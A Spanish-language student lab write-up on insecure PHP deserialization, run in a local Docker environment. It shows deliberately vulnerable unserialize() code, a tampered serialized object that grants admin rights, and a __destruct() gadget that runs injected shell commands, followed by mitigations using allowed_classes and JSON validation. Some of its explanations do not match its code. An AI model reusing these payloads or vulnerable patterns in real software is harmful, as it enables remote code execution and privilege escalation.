# PPS-Unidad3Actividad-DeserializacionInsegura_Angel
Explotación y Mitigación de vulnerabilidad de Deserialización Insegura 

Objetivos:

* Comprobar cómo se pueden realziar ataques de Deserialización insegura.

* Analizar el código de la aplicación que permite ataques de Deserialización insegura.

* Explorar la deserialización insegura y mitigarlo con JSON.

* Implementar diferentes modificaciones del código para aplicar mitigaciones o soluciones.

---

## ¿Qué es Deserialización Insegura (Unsafe Deserialization)?

La deserialización insegura es una vulnerabilidad que ocurre cuando una aplicación procesa datos serializados sin aplicar controles de validación adecuados. Este comportamiento permite a un atacante manipular dichos datos con el objetivo de alterar el flujo normal de ejecución de la aplicación o incluso de ejecutar código malicioso en el sistema.


### Riesgos y consecuencias

* Escalada de privilegios
* Ejecución remota de código
* Manipulación de datos internos de la aplicación:

Ejecución remota de código (RCE): Si el objeto deserializado invoca métodos especiales como __wakeup() o __destruct() (en PHP), o readObject() (en Java), el atacante puede diseñar una carga maliciosa que se ejecute automáticamente al deserializar.

Escalada de privilegios: Al modificar propiedades internas del objeto, un atacante podría obtener privilegios elevados, como transformar una cuenta de usuario estándar en una cuenta de administrador.

Manipulación de la lógica de la aplicación: El atacante puede alterar el comportamiento interno de la aplicación, afectando decisiones de negocio o el control de acceso.


## Actividades

- Leer la sección de vulnerabilidades de subida de archivos de la página de __PortWigger__ <https://portswigger.net/web-security/deserialization>

- Leer el [documento sobre Explotación y Mitigación de ataques de Remote Code Execution](./files/ExplotacionYMitigacionDeserializacionInsegura.pdf)



## Operaciones

### Iniciar entorno de pruebas


```
docker-compose up -d
```

### Código vunerable 

La vulnerabilidad surge por el uso de objetos en aplicaciones que necesitan enviar información a través de la red o entre componentes del sistema. Para este proceso los objetos de serializan, es decir, se convierten en un formato para ser enviados y para que se reconstruyan después en su forma orignal con deserialización.

El problema está cuando la aplicación deserializa los datos sin aplicar validaciones como (unserialize($_GET['data'])) que permite que un atacante modifique el objeto y otorgar privilegios no autorizados.

Para mostrar las variables del objeto serializado, creamos un archivo vulnerable llamado **MostrarObjeto.php** con el siguiente contenido:

```
<?php
class User {
    public $username;
    public $isAdmin = false;

}

if (isset($_GET['data'])) {
    $data = $_GET['data'];
    $obj = @unserialize($data);

    echo "<h3>Objeto deserializado:</h3>";
    echo "<pre>";
    print_r($obj);
    echo "</pre>";

    // Opcional: forzar destrucción
    unset($obj);
} else {
    echo "No se proporciona� ningun dato.";
}

```

![](Images/img1.png)

A su vez, creamos un archivo llamado **GenerarObjeto.php** para poder visualizar los datos serializados y mostrar así un enlace al archivo MostrarObjeto.php. 

El contenido de GenerarObjeto.php es el siguiente:


```
<?php
class User {
    public $username;
    public $isAdmin = false;
}

$serialized = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = new User();
    $user->username = $_POST['username'] ?? 'anon';
    $user->isAdmin = ($_POST['isAdmin'] ?? '0') === '1';

    $serialized = serialize($user);
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Generador de Objeto Serializado</title>
</head>
<body>
    <h2>Generar objeto serializado</h2>
    <form method="post">
        <label>Nombre de usuario:</label>
        <input type="text" name="username" required><br><br>

        <label>¿Administrador?</label>
        <select name="isAdmin">
            <option value="0">No</option>
            <option value="1">Sí</option>
        </select><br><br>

        <button type="submit">Generar</button>
    </form>

    <?php if ($serialized): ?>
        <h3>Objeto serializado:</h3>
        <textarea cols="80" rows="4"><?= htmlspecialchars($serialized) ?></textarea><br><br>

        <p>
            <strong>Enlace para probar:</strong><br>
            <a href="MostrarObjeto.php?data=<?= urlencode($serialized) ?>" target="_blank">
                MostrarObjeto.php?data=<?= htmlspecialchars(urlencode($serialized)) ?>
            </a>
        </p>
    <?php endif; ?>
</body>
</html>
```

![](Images/img2.png)

Esto nos permite:

- Crear objetos User con isAdmin= true o false.

- Ver la cadena serializada.

- Verificar directamente el exploit en el script MostrarObjeto.php (o el que verifica isAdmin).




A continuación, comprobamos como queda el objeto serializado:

`O:4:"User":2:{s:8:"username";s:4:"Raul";s:7:"isAdmin";b:0;}`


Esto nos dará el enlace para probarlo, por lo que lo enviamos a MostrarObjeto.php

```
http://localhost/MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3B%7D
```

Vemos cómo podemos preparar la ruta para mostrar el objeto serializado conectando:

`http://localhost/MostrarObjeto.php?data=` con el objeto serializado, en este caso: `O:4:"User":2:{s:8:"username";s:4:"Raul";s:7:"isAdmin";b:0;}`


![](Images/img.png)


---


##  Explotación de Deserialización Insegura

A la hora de intercambiar objetos entre diferentes módulos, pasamos el objeto serializado. Esto lo pueden usar atacantes para envair a nuestros códigos PHP la serialización modificada.

**Crear un objeto malicioso en PHP**





----------------------------------------------------------



**Crear un objeto malicioso en PHP**

![](images/UD5.png)

Como podemos ver, del enlace generado, cualquier persona puede saber, el nombre del tipo de objetos, variables y valores que tienen.

Por ejemplo, el usuario Raul podría:


**1 - Modificar la serialización.**

El objeto serializado es: 

~~~
MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**0**%3B%7D
~~~

Podemos cambiar los datos del valor IsAdmin:

~~~
MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**1**%3B%7D 
~~~

![](images/UD6.png)

Raul podría haber cambiado su estado, convirtiéndose en administrador.


**2 - Crear un archivo para crear la serialización con los datos que se deseen.**

Crear el archivo **HackerAdmin.php**  y ejecutar este código en la máquina atacante:

~~~
<?php
class User {
	public $username = "hacker";
	public $isAdmin = true;
}
echo urlencode(serialize(new User()));
?>
~~~

Salida esperada (ejemplo):

~~~
O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
~~~

Este objeto serializado podemos usarlo para enviarlo a MostrarObjeto.php y así hacker sería administrador.

![](images/UD6.png)


- Copiar la salida obtenida

- Acceder a esta URL en el navegador `http://localhost/MostrarObjdeto.php?data=` y concatenarla con el código obtenido:


Al mandarlo, tendríamos el mismo resultado, Hacker se convierte en `Admin`.


~~~
http://localhost/MostrarObjdeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
~~~


![](images/UD2.png)


**Intentar RCE con __destruct()**

Si la clase User tiene un método **__destruct()**, se puede abusar para ejecutar código en el servidor. Este es el riesgo mayor al explotar la deserialización.

Aquí tenemos nuestra clase modificada con **Destruct()**. Crea el fichero **GenerarObjeto1.php**


~~~
<?php
class User {
    public $username;
    public $isAdmin = false;
    public $cmd;

    public function __destruct() {
        if (!empty($this->cmd)) {
            //echo "<pre>Ejecutando comando: {$this->cmd}\n";
            system($this->cmd);
            //echo "</pre>";
        }
    }
}
$serialized = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = new User();
    $user->username = $_POST['username'] ?? 'anon';
    $user->isAdmin = ($_POST['isAdmin'] ?? '0') === '1';

    $serialized = serialize($user);
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Generador de Objeto Serializado</title>
</head>
<body>
    <h2>Generar objeto serializado</h2>
    <form method="post">
        <label>Nombre de usuario:</label>
        <input type="text" name="username" required><br><br>

        <label>¿Administrador?</label>
        <select name="isAdmin">
            <option value="0">No</option>
            <option value="1">Sí</option>
        </select><br><br>

        <button type="submit">Generar</button>
    </form>

    <?php if ($serialized): ?>
        <h3>Objeto serializado:</h3>
        <textarea cols="80" rows="4"><?= htmlspecialchars($serialized) ?></textarea><br><br>

        <p>
            <strong>Enlace para probar:</strong><br>
            <a href="MostrarObjeto.php?data=<?= urlencode($serialized) ?>" target="_blank">
                MostrarObjeto.php?data=<?= htmlspecialchars(urlencode($serialized)) ?>
            </a>
        </p>
    <?php endif; ?>
</body>
</html>

~~~

Este cambio introduce:

- Una nueva propiedad **$cmd** que contendrá el comando a ejecutar.

- El método **__destruct()** que se dispara automáticamente al final del script (cuando el objeto es destruido), lo que lo hace perfecto para ilustrar la explotación por deserialización.

Vamos a modificar el objeto malicioso para introducir un código a ejecutar. El atacante de esta manera, podría serializar el objeto introduciendo un código para ejecutar en nuestro servidor, Este archivo lo llamo **explotarGenerarObjeto1.php**:

~~~
<?php
class User {
    public $username;
    public $isAdmin = false;
    public $cmd;

    public function __destruct() {
        if (!empty($this->cmd)) {
            // ⚠️ Ejecución insegura de código del sistema
            echo "<pre>Ejecutando comando: {$this->cmd}\n";
            system($this->cmd);
            echo "</pre>";
        }
    }
}

$serialized = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = new User();
    $user->username = $_POST['username'] ?? 'anon';
    $user->isAdmin = ($_POST['isAdmin'] ?? '0') === '1';
    $user->cmd = $_POST['cmd'] ?? '';

    $serialized = serialize($user);
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Generador de Objeto Serializado</title>
</head>
<body>
    <h2>Generar objeto serializado con código ejecutable</h2>
    <form method="post">
        <label>Nombre de usuario:</label>
        <input type="text" name="username" required><br><br>

        <label>¿Administrador?</label>
        <select name="isAdmin">
            <option value="0">No</option>
            <option value="1">Sí</option>
        </select><br><br>

        <label>Comando a ejecutar (ej: <code>whoami</code>):</label><br>
        <input type="text" name="cmd" size="50"><br><br>

        <button type="submit">Generar</button>
    </form>

    <?php if ($serialized): ?>
        <h3>Objeto serializado:</h3>
        <textarea cols="80" rows="4"><?= htmlspecialchars($serialized) ?></textarea><br><br>

        <p>
            <strong>Enlace para probar:</strong><br>
            <a href="MostrarObjeto1.php?data=<?= urlencode($serialized) ?>" target="_blank">
                MostrarObjeto.php?data=<?= htmlspecialchars(urlencode($serialized)) ?>
            </a>
        </p>
    <?php endif; ?>
</body>
</html>
~~~

🧪 Para la prueba

1. Marca "Sí" en la opción de administrador.

2. Escribe un comando como **whoami, ls -l, id**, etc.

3. Se serializa el objeto incluyendo ese comando.

4. Al deserializarlo en **MostrarObjeto.php**, se ejecuta automáticamente en el **__destruct(**).

![](images/UD7.png)

El atacante habría inyectado en la serialización la ejecución del comando `ls -l /tmp/output.txt`pero podría haber sido cualquier otro comando.

![](images/UD8.png)

Vemos en el resultado que la ejecución no parece anómalo, pero veamos que ha pasado en el servidor.

![](images/UD9.png)

Veamos que contiene el archivo `/tmp/output.txt`. 

Como nosotros extamos usando docker, o bien entramos dentros del servidor apacher y vemos el archivo, o ejecutamos el siguiente comando docker para que nos lo muestre:

~~~
docker exec -it lamp-php83 /bin/bash -c 'cat /tmp/output.txt'
~~~

![](images/UD10.png)

Como vemos, hemos podido ejecutar comandos dentro del servidor. En este caso con el usuario **www-data**, pero si lo combinamos con otros ataques como escalada de privilegios, podríamos haber ejecutado cualquier comando.

## Mitigación de Unsafe Deserialization
---

### ¿Cómo Validar los datos?

Si queremos mitigar realmente ese problema (que no se puedan añadir propiedades inesperadas), una estrategia efectiva es usar la interfaz **Serializable** o **__wakeup()** junto con la visibilidad privada o protegida de las propiedades, y una validación explícita del contenido deserializado.


Este código:

- Aún usa **unserialize()** (sólo lo usamos para propósitos educativos, no debe usarse en un entorno real).

- Valida que el objeto es de la clase esperada.

- Valida que las propiedades están bien formadas (por tipo y existencia).

- Aún permite ver el riesgo de __destruct() si no se valida bien.

Para ello creamos el archivo **MostrarObjeto1.php**:

~~~
<?php
class User {
    public $username;
    public $isAdmin = false;

    public function __destruct() {
        if (!empty($this->cmd)) {
            echo "<pre>Ejecutando comando (simulado): {$this->cmd}</pre>";
            // system($this->cmd); // ← mantener comentado para pruebas seguras
        }
    }
}

if (isset($_GET['data'])) {
    $data = $_GET['data'];

    // Deserialización segura: solo se permite la clase User
    $obj = @unserialize($data, ['allowed_classes' => ['User']]);

    if (!$obj instanceof User) {
        echo "Error: El objeto deserializado no es de tipo User.";
        exit;
    }

    // Propiedades permitidas
    $propiedadesPermitidas = ['username', 'isAdmin'];

    // Obtener propiedades reales del objeto deserializado
    $propiedadesObjeto = array_keys(get_object_vars($obj));

    // Verificar que no hay propiedades adicionales
    $propiedadesExtra = array_diff($propiedadesObjeto, $propiedadesPermitidas);

    if (!empty($propiedadesExtra)) {
        echo "<h3>Error:</h3>";
        echo "El objeto contiene propiedades no permitidas: <pre>" . implode(", ", $propiedadesExtra) . "</pre>";
        exit;
    }

    // Validar tipos de propiedades
    $errores = [];

    if (!isset($obj->username) || !is_string($obj->username)) {
        $errores[] = "El campo 'username' no está definido o no es una cadena.";
    }

    if (!isset($obj->isAdmin) || !is_bool($obj->isAdmin)) {
        $errores[] = "El campo 'isAdmin' no está definido o no es booleano.";
    }


    if (!empty($errores)) {
        echo "<h3>Errores de validación:</h3><ul>";
        foreach ($errores as $e) {
            echo "<li>" . htmlspecialchars($e) . "</li>";
        }
        echo "</ul>";
        exit;
    }

    echo "<h3>Objeto deserializado válidamente:</h3>";
    echo "<pre>";
    print_r($obj);
    echo "</pre>";

    // Forzar destrucción
    unset($obj);
} else {
    echo "No se proporciona ningún dato.";
}
~~~



Esta versión:

- Usa propiedades privadas.

- Implementa la interfaz **Serializable**.

- Valida los datos antes de restaurarlos.

- Impide que se inyecten propiedades no autorizadas.



**Explicación de la Validación de Claves**
---

~~~
http://localhost/deserialize_full.php?data={"username":"hacker","isAdmin":true, "bypass":"0"}
~~~

Si se detecta un parámetro no permitido (bypass en este caso), se muestra el error:

`Error: Clave inválida detectada`

![](images/UD12.png)


✅ ¿Qué mejora esta versión?

- No se pueden inyectar propiedades personalizadas, ya que solo se deserializa lo que explícitamente se espera.

- No hay ejecución de comandos.

- Control total de cómo se deserializa el objeto.


### Utilizando JSON 
---

La mejor forma de evitar ataques de deserialización insegura es no usar **unserialize()** con datos externos.

Usar *JSON* en lugar de **serialize()**.

Además, si quieresmos reforzar aún más la seguridad, podemos comprobar que las claves que pasamos són únicamente las claves permitidas, así que corresponden con los tipos de datos que deberían. 

✅ Creamos el archivo **MostrarObjetoJson.php**:

~~~
<?php
class User {
    private $username;
    private $isAdmin = false;
    private $cmd;

    public function __construct($username, $isAdmin, $cmd) {
        $this->username = $username;
        $this->isAdmin = $isAdmin;
        $this->cmd = $cmd;
    }

    public function __toString() {
        return "Usuario: {$this->username}<br>" .
               "Es administrador: " . ($this->isAdmin ? "Sí" : "No") . "<br>" .
               "Comando: " . htmlspecialchars($this->cmd);
    }
}

if (isset($_GET['data'])) {
    $json = $_GET['data'];

    $data = json_decode($json, true);

    // Validar que sea JSON válido
    if (json_last_error() !== JSON_ERROR_NONE) {
        echo "JSON mal formado.";
        exit;
    }

    // Claves permitidas
    $clavesPermitidas = ['username', 'isAdmin', 'cmd'];
    $clavesRecibidas = array_keys($data);

    // Verificar si hay claves no permitidas
    $clavesNoPermitidas = array_diff($clavesRecibidas, $clavesPermitidas);

    if (!empty($clavesNoPermitidas)) {
        echo "Error: El JSON contiene claves no permitidas: ";
        echo "<pre>" . implode(", ", $clavesNoPermitidas) . "</pre>";
        exit;
    }

    // Validar tipos de datos
    if (!isset($data['username'], $data['isAdmin'], $data['cmd']) ||
        !is_string($data['username']) ||
        !is_bool($data['isAdmin']) ||
        !is_string($data['cmd'])) {
        echo "Datos inválidos.";
        exit;
    }

    // Crear el objeto
    $user = new User($data['username'], $data['isAdmin'], $data['cmd']);

    echo "<h3>Datos recibidos:</h3>";
    echo "<pre>{$user}</pre>";
} else {
    echo "No se proporciona ningún dato.";
}
~~~

Vamos a crear también el archivo **GenerarObjetoJson.php** que nos creará un objeto JSON Alumno que es administrador:

~~~
<?php
$data = [
    "username" => "alumno",
    "isAdmin" => true,
    "cmd" => "id" // esto no se ejecutará, solo se mostrará como texto
];
echo urlencode(json_encode($data));

~~~
🧪 Cómo probarlo

- Acceder al php de generación de JSON:

~~~
http://localhost/GenerarObjetoJson.php
~~~

- Objetnemos el JSON:

~~~
%7B%22username%22%3A%22alumno%22%2C%22isAdmin%22%3Atrue%2C%22cmd%22%3A%22id%22%7D
~~~

- Concatenar el JSON con la url de MostrarObjetoJson.php

~~~
http://localhost/MostrarObjetoJson.php?data=%7B%22username%22%3A%22alumno%22%2C%22isAdmin%22%3Atrue%2C%22cmd%22%3A%22id%22%7D
~~~

La ejecución solo se permitirá si los datos contienen exclusivamente **username** y **isAdmin**.

Ahora nos muestra los datos que hemos introducido. Incluso si hemos intentado introducir un comando para explotar, nos muestra sólo el cómando, no lo ejecuta:

![](images/UD13.png)

- Y si probamos  modificando **MostrarObjetoJson.php** para que no esté incluído el comando:

~~~
class User {
    private $username;
    private $isAdmin = false;
~~~


- Si quieres puedes utilizar el siguiente código  para crear el objeto de forma interactiva, nos mostrará el enlace a **MostrarObjetoJson.php** con el objeto.

~~~
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Generador de Objeto JSON</title>
</head>
<body>
    <h2>Generar objeto en formato JSON</h2>
    <form method="post">
        <label>Nombre de usuario:</label>
        <input type="text" name="username" required><br><br>

        <label>¿Administrador?</label>
        <select name="isAdmin">
            <option value="0">No</option>
            <option value="1">Sí</option>
        </select><br><br>

        <button type="submit">Generar</button>
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'];
        $isAdmin = $_POST['isAdmin'] == '1' ? true : false;

        // Puedes agregar más validación aquí si quieres

        $data = [
            "username" => $username,
            "isAdmin" => $isAdmin,
            "cmd" => ""  // Opcionalmente se puede dejar vacío o no incluirlo
        ];

        $json = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        $encoded = urlencode($json);
        ?>

        <h3>Objeto JSON generado:</h3>
        <textarea cols="80" rows="6"><?= htmlspecialchars($json) ?></textarea><br><br>

        <p>
            <strong>Enlace para probar:</strong><br>
            <a href="MostrarObjetoJson.php?data=<?= $encoded ?>" target="_blank">
                MostrarObjetoJson.php?data=<?= htmlspecialchars($encoded) ?>
            </a>
        </p>
    <?php } ?>
</body>
</html>

~~~
![](images/UD14.png)

✅ Ventajas de usar JSON

- No crea objetos automáticamente, por lo que no hay métodos mágicos como **__destruct()** que se ejecuten.

- Es más legible y portable entre lenguajes.

- **json_decode()** NO ejecuta código PHP, evitando RCE.

- Validación explícita de los datos, sin riesgo de objetos maliciosos.

➡️  Al intentar introducir otros atributos dentro del objeto **user** otros datos:
~~~
<?php
$data = [
  "username"=> "pepe",
  "isAdmin" => false,
  "cmd" => "id",
  "extra" => "soy malo 😈"
];
echo urlencode(json_encode($data));
~~~

Tendremos unos datos codificados,  por lo que para probar, tendríamos el siguiente enlace:
 
~~~
http://localhost/MostrarObjetoJson.php?data=%7B%22username%22%3A%22alumno%22%2C%22isAdmin%22%3Atrue%2C%22cmd%22%3A%22id%22%7D
~~~

Ahora vemos como nos da error en el caso de que intentemos meter los objetos serializados en vez de mandarlos en forma de JSON.

![](images/UD15.png)

El código no lo detecta como inválido

🚀 **Conclusiones**

Usar JSON en lugar de **serialize()/unserialize()** es una de las mejores formas de evitar la deserialización insegura, ya que **JSON** solo representa datos, no objetos con métodos o comportamientos.





> Ángel Pérez Blanco
